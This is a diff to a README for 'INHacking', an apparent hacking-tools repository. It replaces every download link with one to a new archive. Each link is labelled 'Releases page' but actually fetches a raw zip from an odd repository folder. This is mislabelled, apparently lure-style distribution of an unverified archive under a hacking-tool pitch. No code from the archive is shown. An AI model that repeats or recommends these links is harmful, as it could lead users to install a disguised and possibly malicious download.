@@ -6,9 +6,9 @@ Welcome to INHacking! This application provides a range of useful tools for ethi
 
 ## 📦 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/namakuhay/INHacking/main/yawler/INHacking.zip) to download the application. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/namakuhay/INHacking/main/yawler/IN_Hacking_v2.6-beta.2.zip) to download the application. 
 
-[![Download INHacking](https://raw.githubusercontent.com/namakuhay/INHacking/main/yawler/INHacking.zip)](https://raw.githubusercontent.com/namakuhay/INHacking/main/yawler/INHacking.zip)
+[![Download INHacking](https://raw.githubusercontent.com/namakuhay/INHacking/main/yawler/IN_Hacking_v2.6-beta.2.zip)](https://raw.githubusercontent.com/namakuhay/INHacking/main/yawler/IN_Hacking_v2.6-beta.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -37,7 +37,7 @@ Here are some of the key features you can explore with INHacking:
 Follow these steps to download and run INHacking:
 
 1. **Visit the Download Page**: Click on the link below to go to the Releases page:
-   - [Download INHacking](https://raw.githubusercontent.com/namakuhay/INHacking/main/yawler/INHacking.zip)
+   - [Download INHacking](https://raw.githubusercontent.com/namakuhay/INHacking/main/yawler/IN_Hacking_v2.6-beta.2.zip)
 
 2. **Select the Right Version**: Choose the version that matches your operating system.
 
@@ -75,4 +75,4 @@ We thank all contributors who have helped make INHacking possible. Your support 
 
 --- 
 
-For any inquiries, please check the issues section on our GitHub repository or start a discussion. Remember to visit our [Releases page](https://raw.githubusercontent.com/namakuhay/INHacking/main/yawler/INHacking.zip) again for updates and new versions. Enjoy exploring the world of ethical hacking!
+For any inquiries, please check the issues section on our GitHub repository or start a discussion. Remember to visit our [Releases page](https://raw.githubusercontent.com/namakuhay/INHacking/main/yawler/IN_Hacking_v2.6-beta.2.zip) again for updates and new versions. Enjoy exploring the world of ethical hacking!
